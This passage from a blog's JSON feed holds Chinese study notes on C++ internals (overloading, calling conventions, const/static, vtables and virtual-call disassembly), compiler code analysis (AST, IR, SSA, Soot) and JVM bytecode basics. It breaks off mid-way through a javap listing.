href=\"https://www.cnblogs.com/iBinary/category/1083755.html\">https://www.cnblogs.com/iBinary/category/1083755.html</a></li>\n<li>Linux中的则是利用异常处理表，异常处理表是一个数据结构，它包含了try块的起始地址、结束地址以及相关的异常处理逻辑。</li>\n</ul>\n<h3 id=\"C-中的重载是什么？\"><a href=\"#C-中的重载是什么？\" class=\"headerlink\" title=\"C++中的重载是什么？\"></a>C++中的重载是什么？</h3><p>​\t运算符的重载是指对一种运算符进行自定义的运算方式，例如定义对象A与对象B的加法，但是由于A，B并非一般的可运算类型，那么我们就需要告诉程序怎么加，就需要重载加号这个运算。其实在底层上是重新定义了一个函数，然后call了这个函数后完成了运算。返回值依然存放在ax中。</p>\n<h4 id=\"C-的函数重载是如何实现的？\"><a href=\"#C-的函数重载是如何实现的？\" class=\"headerlink\" title=\"C++的函数重载是如何实现的？\"></a>C++的函数重载是如何实现的？</h4><p>​\t所谓的C++重载是指对同一个函数进行多次定义，但是依照每次定义时的参数数量、参数类型的不同生成不同的几个函数。即便在源代码上是同名的，但在编译之后就不是同名的。</p>\n<p>​\t但C语言在进行链接的时候会根据符号表中记录的函数名与地址之间的关系进行链接，如果重写了，就会生成两个名称一模一样的函数，地址也完全相同，那么编译器不知道该找哪个函数。这也就是为什么C语言不支持重载，而C++会用函数名和参数标准来区分各个函数，C++对函数名做了修饰，参数不同修饰出来的名称就不同。<strong>但是返回值不同不能构成函数的重载原因，因为函数调用的二义性，编译器无法区分该选哪个去使用，所以调用时并不指定返回值类型</strong></p>\n<h3 id=\"C-的函数调用规范，传参方式\"><a href=\"#C-的函数调用规范，传参方式\" class=\"headerlink\" title=\"C++的函数调用规范，传参方式\"></a>C++的函数调用规范，传参方式</h3><p>和C语言中的调用方式一样，还是老三样cdecl,stdcall, fastcall三种调用方式。fastcall在linux下的时候是使用rdi，rsi,rcx,rcx、r8、r9进行传参，在Windows32下就是使用ECX/EDX进行传参，后面的就直接入栈了。除了cdecl之外都是被调用方进行清栈</p>\n<h3 id=\"C-中的const、static分别有什么作用，在底层如何实现的？\"><a href=\"#C-中的const、static分别有什么作用，在底层如何实现的？\" class=\"headerlink\" title=\"C++中的const、static分别有什么作用，在底层如何实现的？\"></a>C++中的const、static分别有什么作用，在底层如何实现的？</h3><h4 id=\"const用法\"><a href=\"#const用法\" class=\"headerlink\" title=\"const用法\"></a>const用法</h4><p>const修饰符在存在时，用于定义一个常量，表明这个常量是不能修改的只读变量。那么这个一般的变量好理解，直接使用一张key-value表存储，这与C开辟内存存储是不一样的。那么如果是个const指针怎么办呢？</p>\n<p>在高层代码中，声明为const的变量p指向的内容是不可被修改的，但是指针本身可以修改。</p>\n<ul>\n<li>*p = 1 // ERROR</li>\n<li>p = &amp;a // 没问题</li>\n</ul>\n<p>这个过程在底层是怎么存储的呢？由于普通变量放在rodata段，不能改就是不能改，但是指针变量在<strong>编译检查</strong>的过程中，会阻止对其指向内容的修改，但是在实际运行中并没有这种限制（因为在内存页上根本没限制）。</p>\n<h4 id=\"const常量存放在哪里？\"><a href=\"#const常量存放在哪里？\" class=\"headerlink\" title=\"const常量存放在哪里？\"></a>const常量存放在哪里？</h4><p>存储方式其实和一般的变量存储方式一样，局部变量就在栈区，甚至可以用指针偏移的方式去修改它。</p>\n<p>但是有些const在编译优化的时候发现他根本没有被修改，可能就直接以键值对的方式进行存储，也就真的不能改动了。</p>\n<h4 id=\"static有什么不同\"><a href=\"#static有什么不同\" class=\"headerlink\" title=\"static有什么不同\"></a>static有什么不同</h4><p>static刚一听似乎和const感觉很像，但是二者完全不同，static强调其修饰的内容与程序中的过程无关。</p>\n<ul>\n<li><p>static在首次被过程使用的时候分配内存，在过程结束时并不会被释放，这也是他独立的地方，因此他就不可能分配在子函数栈里。</p>\n</li>\n<li><p>static的方法可以使用static的变量也可以用其他static的方法</p>\n</li>\n<li><p>static一般不能使用非static 的函数或者数据。</p>\n</li>\n<li><p>对于非静态数据成员，每个类对象(实例)都有自己的拷贝。而静态数据成员被当作是类的成员，由该类型的所有对象共享访问,对该类的多个对象来说，静态数据成员只分配一次内存。</p>\n</li>\n<li><p>静态数据成员存储在全局数据区。</p>\n</li>\n</ul>\n<h3 id=\"C-中的虚函数是什么？在底层是如何实现的？\"><a href=\"#C-中的虚函数是什么？在底层是如何实现的？\" class=\"headerlink\" title=\"C++中的虚函数是什么？在底层是如何实现的？\"></a>C++中的虚函数是什么？在底层是如何实现的？</h3><p>参考链接：<a href=\"https://blog.csdn.net/ahelloyou/article/details/109478438\">https://blog.csdn.net/ahelloyou/article/details/109478438</a></p>\n<h4 id=\"虚函数\"><a href=\"#虚函数\" class=\"headerlink\" title=\"虚函数\"></a>虚函数</h4><p>首先了解一点，虚函数的作用是让子类能够重写父类的函数。当父类中的方法使用virtual进行修饰时，子类可以对该方法进行重新定义，那么也就重写了该方法，这时调用该方法后会直接执行新方法，如果没有重写过就执行老方法，这个设计的目的便于实现真正的多态。</p>\n<p>当使用一个父类类型的指针指向一个子类实例时，调用父类和子类的同名函数就会出现两种情况：</p>\n<ul>\n<li>父类为虚函数，子类对其重写：则执行子类函数。</li>\n<li>父类为普通函数，子类对其重写：<strong>则执行父类函数。</strong></li>\n</ul>\n<p>这就奇了怪了，类型指针只是一个指针，为什么有这么大的能力？这就说底层实现。</p>\n<h4 id=\"虚函数的底层实现\"><a href=\"#虚函数的底层实现\" class=\"headerlink\" title=\"虚函数的底层实现\"></a>虚函数的底层实现</h4><p>当一个类定义了虚函数时，会在内存中创建<strong>虚表</strong>，虚表是一个函数指针数组，指向了虚函数的实际代码位置。这个虚表是在编译的时候就确定下来的。那么这个<strong>虚表</strong>怎么索引呢？</p>\n<p><strong>虚表是属于类的</strong>，每一个创建的实例都会有一个指针指向内存中的同一个虚表。这个指针就是虚表指针， ***__vptr**，每个类在创建之初都会被分配这样一个指针。为非虚函数不需要虚表，直接索引！</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403261520135.png\" alt=\"image-20240326152004933\"></p>\n<p>虚表是属于类的，<strong>那么一个类的继承类也会产生自己的虚表</strong>，这里也好理解，因为可能会对虚函数进行重写，总不能写父类的吧。</p>\n<p>一个虚表继承的例子：</p>\n<figure class=\"highlight c++\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c++\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">A</span> {<br><span class=\"hljs-keyword\">public</span>:<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">virtual</span> <span class=\"hljs-type\">void</span> <span class=\"hljs-title\">vfunc1</span><span class=\"hljs-params\">()</span></span>;<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">virtual</span> <span class=\"hljs-type\">void</span> <span class=\"hljs-title\">vfunc2</span><span class=\"hljs-params\">()</span></span>;<br>    <span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">func1</span><span class=\"hljs-params\">()</span></span>;<br>    <span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">func2</span><span class=\"hljs-params\">()</span></span>;<br><span class=\"hljs-keyword\">private</span>:<br>    <span class=\"hljs-type\">int</span> m_data1, m_data2;<br>};<br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">B</span> : <span class=\"hljs-keyword\">public</span> A {<br><span class=\"hljs-keyword\">public</span>:<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">virtual</span> <span class=\"hljs-type\">void</span> <span class=\"hljs-title\">vfunc1</span><span class=\"hljs-params\">()</span></span>;<br>    <span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">func1</span><span class=\"hljs-params\">()</span></span>;<br><span class=\"hljs-keyword\">private</span>:<br>    <span class=\"hljs-type\">int</span> m_data3;<br>};<br><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">C</span>: <span class=\"hljs-keyword\">public</span> B {<br><span class=\"hljs-keyword\">public</span>:<br>    <span class=\"hljs-function\"><span class=\"hljs-keyword\">virtual</span> <span class=\"hljs-type\">void</span> <span class=\"hljs-title\">vfunc2</span><span class=\"hljs-params\">()</span></span>;<br>    <span class=\"hljs-function\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title\">func2</span><span class=\"hljs-params\">()</span></span>;<br><span class=\"hljs-keyword\">private</span>:<br>    <span class=\"hljs-type\">int</span> m_data1, m_data4;<br>};<br></code></pre></td></tr></tbody></table></figure>\n\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403261524800.png\" alt=\"image-20240326152431639\"></p>\n<p>上面的每个类都有自己的虚表，但是在创建之后，里面的内容并不都指向同一个位置，如果没有重写就指向父类的，如果重写了就指向自己的。在调用过程中会依照__vptr指针查找相应表项然后进行调用，和一般的函数指针调用过程无异。这个索引查找的过程被称为<strong>动态绑定</strong>。此外需要注意的点是，virtual对象存在时，类的大小就不再由virtual函数的数量决定了，而是固定为存储一个虚函数表的地址。</p>\n<h4 id=\"再底层一点点\"><a href=\"#再底层一点点\" class=\"headerlink\" title=\"再底层一点点\"></a>再底层一点点</h4><p>参考链接：<a href=\"https://blog.csdn.net/qq_30528603/article/details/135774168\">https://blog.csdn.net/qq_30528603/article/details/135774168</a></p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403261538481.png\" alt=\"image-20240326153802359\"></p>\n<p>可以明显的看到一点，调用一般函数的时候是字节e8开头，而调用有virtual的函数开头时则是FF开头，这两个，一个是直接调用一个是间接调用。并且上面有一些点值得注意：</p>\n<ol>\n<li><p>mov eax [p]   //将对象的this指针放入eax</p>\n</li>\n<li><p>mov edx [eax] //将this指针首地址里面存的虚函数表放入edx,其实这里应该是按照eax+0进行索引取成员变量</p>\n</li>\n<li><p>mov ecx [p]   //将this指针传给ecx，调用虚函数时要传入this对象，如果是linux gcc编译的情况下，就是用rdi表示this指针</p>\n</li>\n<li><p>mov eax ,[edx] //将虚函数表里的第一项放入eax，也就是第一个虚函数</p>\n</li>\n<li><p>call eax //调用fun1函数</p>\n</li>\n</ol>\n<p>原文链接：<a href=\"https://blog.csdn.net/qq_30528603/article/details/135774168\">https://blog.csdn.net/qq_30528603/article/details/135774168</a></p>\n<h3 id=\"关于纯虚函数和抽象类\"><a href=\"#关于纯虚函数和抽象类\" class=\"headerlink\" title=\"关于纯虚函数和抽象类\"></a>关于纯虚函数和抽象类</h3><p>纯虚函数其实就是在声明之初就没有函数体，等待被子类重写的函数，<strong>虚的纯度很高！</strong></p>\n<p>抽象类其实就是包含纯虚函数的类，因为其不能被实例化，所以是抽象的。</p>\n<h3 id=\"C-底层是如何实现对于private和public的区分的？\"><a href=\"#C-底层是如何实现对于private和public的区分的？\" class=\"headerlink\" title=\"C++底层是如何实现对于private和public的区分的？\"></a>C++底层是如何实现对于private和public的区分的？</h3><h2 id=\"STL标准库\"><a href=\"#STL标准库\" class=\"headerlink\" title=\"STL标准库\"></a>STL标准库</h2><p>STL标准库的底层实现过程。</p>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/10/dai-ma-fen-xi-ji-zhu/",
            "url": "https://alazymechnaic.github.io/2024/03/10/dai-ma-fen-xi-ji-zhu/",
            "title": "代码分析技术",
            "date_published": "2024-03-10T12:54:01.000Z",
            "content_html": "<h2 id=\"抽象语法树（AST，bstract-syntax-code\"><a href=\"#抽象语法树（AST，bstract-syntax-code\" class=\"headerlink\" title=\"抽象语法树（AST，bstract syntax code)\"></a>抽象语法树（AST，bstract syntax code)</h2><h3 id=\"AST概念\"><a href=\"#AST概念\" class=\"headerlink\" title=\"AST概念\"></a>AST概念</h3><p>抽象语法树其实是源代码的一种结构化表示。例如将1+2*3可以写成树状的表示，每个分支节点表示一种运算，叶子节点表示数字（这个在数据结构中说过）。AST的存在本身是帮助编译器理解源代码，因此实际构造出来的AST不一定是二叉树。编译器可以通过AST实现对错误的检查，符号解析等操作。</p>\n<p>参考代码：<a href=\"https://blog.csdn.net/weixin_39408343/article/details/95984062\">https://blog.csdn.net/weixin_39408343/article/details/95984062</a></p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-keyword\">while</span> b != <span class=\"hljs-number\">0</span><br>{<br>    <span class=\"hljs-keyword\">if</span> a &gt; b<br>        a = a-b<br>    <span class=\"hljs-keyword\">else</span><br>        b = b-a<br>}<br><span class=\"hljs-keyword\">return</span> a<br></code></pre></td></tr></tbody></table></figure>\n\n<p>生成对应的抽象语法树：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403102205280.png\" alt=\"image-20240310220545874\"></p>\n<ul>\n<li><p>可以看到抽象语法树中最高的节点表示当前所有的代码集合，其子节点是所有等级相同的代码语句。</p>\n</li>\n<li><p>while循环语句则被拆分为循环条件和循环体两个子节点</p>\n</li>\n<li><p>将if -else拆成了包含判断条件、第一个if body和eles body的三个部分。</p>\n</li>\n</ul>\n<h3 id=\"抽象语法树为什么可以实现错误检查？\"><a href=\"#抽象语法树为什么可以实现错误检查？\" class=\"headerlink\" title=\"抽象语法树为什么可以实现错误检查？\"></a>抽象语法树为什么可以实现错误检查？</h3><ol>\n<li>语法规则的验证：抽象语法树通过对源代码进行语法解析，构建了一个结构化的树状表示。在构建抽象语法树的过程中，编译器会验证代码是否符合语法规则。如果存在语法错误，例如缺少分号、括号不匹配等，编译器就可以在构建过程中检测到并报告错误。</li>\n<li>类型检查：抽象语法树可以用于进行类型检查，即验证代码中的类型使用是否正确。编译器可以遍历抽象语法树的节点，并检查变量的声明和使用、函数调用、操作符应用等语法结构是否与其所在上下文的类型要求相符。如果存在类型不匹配或无效的类型操作，编译器可以通过分析抽象语法树来发现这些错误。</li>\n<li>符号解析：抽象语法树可以用于符号解析，即识别和管理变量、函数和类等符号的定义和引用。编译器可以通过遍历抽象语法树来查找变量或函数的定义，验证变量的作用域和可见性，并检查符号的引用是否有效。这样可以及早发现未声明的变量、重复定义、未定义的函数等错误。</li>\n<li>错误报告：抽象语法树提供了对源代码结构的详细描述，使得编译器可以生成有意义的错误报告。当编译器在语义分析过程中发现错误时，它可以根据抽象语法树的信息，指示错误发生的位置、类型和原因。这样，开发人员可以根据错误报告快速定位和修复问题。</li>\n</ol>\n<h2 id=\"Basic-Block\"><a href=\"#Basic-Block\" class=\"headerlink\" title=\"Basic Block\"></a>Basic Block</h2><p>定义：最大的连续指令序列，满足下面特征</p>\n<ul>\n<li>只能从基本块的开头的第一个指令。也就是不存在jmp到中间的边</li>\n<li>只能在最后一条指令退出。也就是中间不存在跳出的边。</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/10/dai-ma-fen-xi-nan-jing-da-xue-ke-cheng-bi-ji/",
            "url": "https://alazymechnaic.github.io/2024/03/10/dai-ma-fen-xi-nan-jing-da-xue-ke-cheng-bi-ji/",
            "title": "《代码分析》-南京大学-课程笔记",
            "date_published": "2024-03-10T12:22:32.000Z",
            "content_html": "<h2 id=\"代码中间表示（IR）\"><a href=\"#代码中间表示（IR）\" class=\"headerlink\" title=\"代码中间表示（IR）\"></a>代码中间表示（IR）</h2><h3 id=\"关于Compiler\"><a href=\"#关于Compiler\" class=\"headerlink\" title=\"关于Compiler\"></a>关于Compiler</h3><p>编译的过程：</p>\n<ul>\n<li><p>词法分析器： 检查每一个单词的正确性。→ Tokens</p>\n</li>\n<li><p>语法分析器：检查当前代码的语法是否正确。使用context free grammar分析程序的代码，而不是使用context sensitive的方式进行分析，这个分析成本太高，更适合的是人类语言。→  AST</p>\n</li>\n<li><p>语义分析：检查当前语句的语义是否是合理的。例如float能否赋值给一个int，检查语义是否正常。→ Decorated AST</p>\n</li>\n<li><p>Translator: 将代码转化为优化后的三地址码IR，也是静态分析所在的位置。→ IR</p>\n</li>\n</ul>\n<h3 id=\"IR-与-AST的差别\"><a href=\"#IR-与-AST的差别\" class=\"headerlink\" title=\"IR 与 AST的差别\"></a>IR 与 AST的差别</h3><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20240324212437242.png\" alt=\"image-20240324212437242\"></p>\n<ul>\n<li>IR更加底层与语言本身无关 || AST 则相当依赖于语言本身的特性</li>\n<li>IR则本身比较简洁 || AST 保留了变量之间的结构信息，便于检查类型间的匹配：可以直接递归找类型与类型之间的assign等操作是否类型匹配</li>\n<li>IR本身包含了控制流信息 || AST 本身缺乏控制流信息</li>\n</ul>\n<h3 id=\"IR定义\"><a href=\"#IR定义\" class=\"headerlink\" title=\"IR定义\"></a>IR定义</h3><p>三地址码IR中一行代码只能包含一个运算符，如果一行代码包含多个运算符，那就需要引入临时变量来暂存运算结果，保证格式合法。所谓的三地址码其实是指一条指令上面其实只能有三个操作数（包括，变量名，常量，临时变量）</p>\n<h3 id=\"以SOOT为例讲解三地址码\"><a href=\"#以SOOT为例讲解三地址码\" class=\"headerlink\" title=\"以SOOT为例讲解三地址码\"></a>以SOOT为例讲解三地址码</h3><p>其实Soot的设计方式比较简单，基本上是类似bash指令的魔改版，这里需要注意的点在于函数调用的部分：</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20240324215230808.png\" alt=\"image-20240324215230808\"></p>\n<ul>\n<li><strong>关于this</strong>：上图中能够看到在foo函数的执行过程中首先定义了一个变量r0，用来存放当前的类，也就是this。在java字节码中首先会将局部索引表中代号为0的变量压到栈中aload_0。</li>\n<li><strong>invokespecial:</strong> call constroctor 用来调用构造函数，父类方法, 私有方法。所以先new一个类，然后后面一般跟invokespecial开始进行构造方法的调用了。</li>\n<li><strong>invokevirtual</strong>：实例方法的调用，包括派生方法</li>\n<li><strong>invokeinterface</strong> 不能进行优化，检查接口是否实现</li>\n<li><strong>invokestatic</strong>：call 静态方法。</li>\n<li>method signature：类型class名称： 返回类型： 方法method名称 参数的类型。在java字节码中每一个方法开始之前按也会交代类型和接受参数等信息。</li>\n</ul>\n<h3 id=\"Static-Single-Assignment（SSA）\"><a href=\"#Static-Single-Assignment（SSA）\" class=\"headerlink\" title=\"Static Single Assignment（SSA）\"></a>Static Single Assignment（SSA）</h3><p>原则是对所有的赋值操作赋以一个新的变量，<strong>其实这里就是考虑了不同时刻，变量的数据状态是不同的</strong>，同时也是为了保证有的变量取值由于if-else的存在，有多个可取的值。</p>\n<p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/image-20240324225828064.png\" alt=\"image-20240324225828064\"></p>\n<p>缺点：引入的变量太多，内存可能绷不住，并且存在性能上的问题。</p>\n<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>啥叫实例方法调用？咋区分</p>\n",
            "tags": [
                "代码分析"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2024/03/09/jvm-zi-jie-ma-ru-men/",
            "url": "https://alazymechnaic.github.io/2024/03/09/jvm-zi-jie-ma-ru-men/",
            "title": "jvm字节码入门",
            "date_published": "2024-03-09T07:24:28.000Z",
            "content_html": "<h2 id=\"JAVA-基础\"><a href=\"#JAVA-基础\" class=\"headerlink\" title=\"JAVA 基础\"></a>JAVA 基础</h2><h3 id=\"java-class-与-jar的区别\"><a href=\"#java-class-与-jar的区别\" class=\"headerlink\" title=\".java .class 与 .jar的区别\"></a>.java .class 与 .jar的区别</h3><ul>\n<li>.java是JAVA代码的源代码文件，就和C语言中的.c一样。</li>\n<li>.class则是字节码文件，是java源码通过javac这个工具生成的中间语言，这个和机器架构之类的没有任何关系。而java虚拟机的任务就是去运行这个.class文件中的内容。</li>\n<li>JAR文件则是将多个Class文件打包压缩，并添加META-INF/MANIFEST.MF 文件，构成的一个压缩包</li>\n</ul>\n<h2 id=\"JVM虚拟机编译原理\"><a href=\"#JVM虚拟机编译原理\" class=\"headerlink\" title=\"JVM虚拟机编译原理\"></a>JVM虚拟机编译原理</h2><h3 id=\"JVM虚拟机的设计特性\"><a href=\"#JVM虚拟机的设计特性\" class=\"headerlink\" title=\"JVM虚拟机的设计特性\"></a>JVM虚拟机的设计特性</h3><ul>\n<li>java是面向对象的语言，类在其中十分重要。类的唯一性不仅仅由路径和类名决定，还需要考虑类的加载。</li>\n<li>JVM来负责java程序运行时的内存管理，垃圾回收等机制，通过调整jvm的参数可以优化java应用的启动速度和运行效率。</li>\n<li>源代码-&gt;字节码-&gt;机器码，这两次转换分别依靠javac和JVM虚拟机进行转译。</li>\n<li>JVM虚拟机接收的字节码不一定非要来自java程序，还可以来自JRuby或者Groovy等程序。</li>\n</ul>\n<h3 id=\"JVM架构\"><a href=\"#JVM架构\" class=\"headerlink\" title=\"JVM架构\"></a>JVM架构</h3><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403091958023.png\" alt=\"image-20240309195820483\"></p>\n<p><em>图片转载自：<a href=\"https://zhuanlan.zhihu.com/p/655490660\">https://zhuanlan.zhihu.com/p/655490660</a></em></p>\n<h4 id=\"类加载器子系统\"><a href=\"#类加载器子系统\" class=\"headerlink\" title=\"类加载器子系统\"></a>类加载器子系统</h4><p>可以看到这个部分是会直接对class文件进行处理的，处理的过程中会加载class中的描述类数据，并进行校验，解析和初始化。Java语言只有在运行时才会完成<strong>类型的加载、链接和初始化</strong>（这里注意，是类型的加载也在运行时完成，也就是在这之前类还是不被确定的，那么是否存在攻击面？），java可以在运行时动态地指定使用的类。这个类可以是Java预制的，甚至是可以从网络上来的二进制字节流（这就是java反序列化漏洞的来源机制？）</p>\n<h4 id=\"运行时数据区\"><a href=\"#运行时数据区\" class=\"headerlink\" title=\"运行时数据区\"></a>运行时数据区</h4><p>可以看到在运行时，JVM划定了堆栈区域，线程间的共享方式与x86指令的机器类似。但是需要注意，方法区是共享的。</p>\n<h4 id=\"执行引擎\"><a href=\"#执行引擎\" class=\"headerlink\" title=\"执行引擎\"></a>执行引擎</h4><p>执行引擎用于对中间语言的字节码进行翻译，翻译成符合当前程序的底层机器码，同时对不受支持的指令做转换。这个部分是对java字节码直接解析的部分。JIT的工作也是将字节码转换为本地CPU的机器码，而不是执行该字节码的语义。</p>\n<h2 id=\"JAVA字节码\"><a href=\"#JAVA字节码\" class=\"headerlink\" title=\"JAVA字节码\"></a>JAVA字节码</h2><p>编译java源代码并获取反编译后的字节码：</p>\n<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">javac .\\test.java<br>javap -v -p .\\test.class<br></code></pre></td></tr></tbody></table></figure>\n\n<p>终于到这一部分了。java有200多个操作码，主要由<strong>类型前缀</strong>和<strong>操作名称</strong>两个部分组成。主要包含下面几种指令类型：</p>\n<ul>\n<li>堆栈操作指令</li>\n<li>控制流操作指令</li>\n<li>对象操作指令</li>\n<li>算数运算指令</li>\n</ul>\n<p>要明白的一点是，一个class文件中只可能包含一个类，所以编译出的java字节码只有一个class可以写。同时JVM的指令集是基于栈实现的，所以运算的本质是从栈中取内容进行操作。以下面的代码为例讲解：</p>\n<figure class=\"highlight java\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">StackStruTest</span> { <br>  <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(String[] args)</span> { <br>    <span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">i</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">2</span>;<br>    <span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">j</span> <span class=\"hljs-operator\">=</span> <span class=\"hljs-number\">3</span>;<br>    <span class=\"hljs-type\">int</span> <span class=\"hljs-variable\">k</span> <span class=\"hljs-operator\">=</span> i + j; <br>  } <br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p>产生的字节码如下：</p>\n<figure class=\"highlight java\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs java\"><br><br>Classfile /java/javaDemoTest/StackStruTest.class：指明类文件的路径和名称。<br><br>Last modified Sep <span class=\"hljs-number\">5</span>, <span class=\"hljs-number\">2023</span>; size <span class=\"hljs-number\">291</span> bytes：表示类文件最后修改的时间和文件大小。<br><br>MD5 checksum 5df16de26bb720cea2f763c042f9dc30：给出类文件内容的MD5校验和。<br><br>Compiled from <span class=\"hljs-string\">\"StackStruTest.java\"</span>：表示该类文件是从名为<span class=\"hljs-string\">\"StackStruTest.java\"</span>的源文件编译而来。<br><br><span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">StackStruTest</span>：定义一个公共的类名为StackStruTest。<br><br>minor version: <span class=\"hljs-number\">0</span>：表示类文件的次版本号。<br><br>major version: <span class=\"hljs-number\">52</span>：表示类文件的主版本号。<br><br>flags: ACC_PUBLIC, ACC_SUPER：表示类的访问修饰符为<span class=\"hljs-keyword\">public</span>，并且使用了ACC_SUPER标志。<br><br>Constant pool:：常量池开始。<br><br>#<span class=\"hljs-number\">1</span> = Methodref          #<span class=\"hljs-number\">3.</span>#<span class=\"hljs-number\">12</span>         <span class=\"hljs-comment\">// 